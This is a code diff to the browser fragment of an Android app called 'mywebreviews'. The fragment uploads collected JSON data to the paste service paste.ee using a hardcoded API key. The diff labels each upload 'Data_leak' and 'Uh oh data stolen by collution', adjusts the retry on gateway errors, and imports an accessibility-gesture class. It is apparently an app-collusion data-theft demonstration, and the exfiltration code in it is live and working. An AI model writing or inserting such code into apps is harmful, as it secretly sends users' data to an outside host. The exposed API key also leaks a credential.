@@ -1,5 +1,6 @@
 package com.mywebreviews;
 
+import android.accessibilityservice.GestureDescription;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Color;
@@ -164,14 +165,19 @@ public class BrowserFragment extends Fragment {
         RequestQueue requestQueue = Volley.newRequestQueue(getActivity());
         String url = "https://api.paste.ee/v1/pastes/?key=umymC56n2oVUIXKK9jPX209JwJZg6Ht0RnJeEJT4N";
 
+        String content = jsonData;
+        String name = "Data_leak";
+        String description = "Uh oh data stolen by collution";
 
         JSONObject postData = new JSONObject();
         JSONArray array = new JSONArray();
         JSONObject fields = new JSONObject();
         try {
-            fields.put("contents",jsonData);
+            fields.put("contents",content);
+            fields.put("name", name);
             array.put(fields);
             postData.put("sections", array);
+            postData.put("description", description);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -194,7 +200,7 @@ public class BrowserFragment extends Fragment {
                     @Override
                     public void onErrorResponse(VolleyError error) {
                         error.printStackTrace();
-                        if (error.networkResponse.statusCode == 512){
+                        if (error.networkResponse.statusCode == 502){//sometimes there is bad gateway error
                             sendData(jsonData, numberOfAttemptsRemaining-1);
                         } else {
                             Toast.makeText(getActivity(), Integer.toString( error.networkResponse.statusCode ), Toast.LENGTH_LONG);
